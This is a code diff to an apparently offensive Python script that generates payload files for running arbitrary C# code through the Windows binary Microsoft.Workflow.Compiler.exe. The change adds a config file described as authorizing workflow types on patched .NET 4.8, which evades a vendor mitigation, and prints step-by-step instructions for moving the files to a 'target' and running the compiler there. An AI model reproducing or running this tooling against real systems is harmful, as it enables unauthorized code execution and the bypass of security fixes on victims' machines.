@@ -200,11 +200,14 @@ def main():
     template_cs_path = args.template or os.path.join(script_dir, "workflow_payload.cs")
     template_xoml_path = os.path.join(script_dir, "workflow_payload.xoml")
     template_xml_path = os.path.join(script_dir, "workflow_input.xml")
-    output_dir = args.output_dir or script_dir
+    config_path = os.path.join(script_dir, "workflow_compiler.exe.config")
+    output_dir = args.output_dir or os.path.join(script_dir, "output")
+    os.makedirs(output_dir, exist_ok=True)
 
     output_cs = os.path.join(output_dir, "workflow_ready.cs")
     output_xoml = os.path.join(output_dir, "workflow_ready.xoml")
     output_xml = os.path.join(output_dir, "workflow_input_ready.xml")
+    output_config = os.path.join(output_dir, "Microsoft.Workflow.Compiler.exe.config")
 
     if not os.path.exists(args.assembly):
         print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
@@ -354,13 +357,24 @@ def main():
         f.write(input_xml)
     print(f"[+] Written: {output_xml}", file=sys.stderr)
 
-    print(f"[*] Transfer all three files to the same directory on target:", file=sys.stderr)
+    # --- Write config file (authorizes workflow types on patched .NET 4.8) ---
+
+    import shutil
+    if os.path.exists(config_path):
+        shutil.copy2(config_path, output_config)
+        print(f"[+] Written: {output_config}", file=sys.stderr)
+
+    print(f"[*] Transfer all files to the same directory on target:", file=sys.stderr)
     print(f"    {os.path.basename(output_cs)}", file=sys.stderr)
     print(f"    {os.path.basename(output_xoml)}", file=sys.stderr)
     print(f"    {os.path.basename(output_xml)}", file=sys.stderr)
+    print(f"    {os.path.basename(output_config)}", file=sys.stderr)
     print(f"[*] On target:", file=sys.stderr)
-    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"
-          f"Microsoft.Workflow.Compiler.exe {os.path.basename(output_xml)} out.log",
+    print(f"    1. Copy compiler to working dir:", file=sys.stderr)
+    print(f"       copy C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"
+          f"Microsoft.Workflow.Compiler.exe .", file=sys.stderr)
+    print(f"    2. Run:", file=sys.stderr)
+    print(f"       .\\Microsoft.Workflow.Compiler.exe {os.path.basename(output_xml)} out.log",
           file=sys.stderr)
 
 
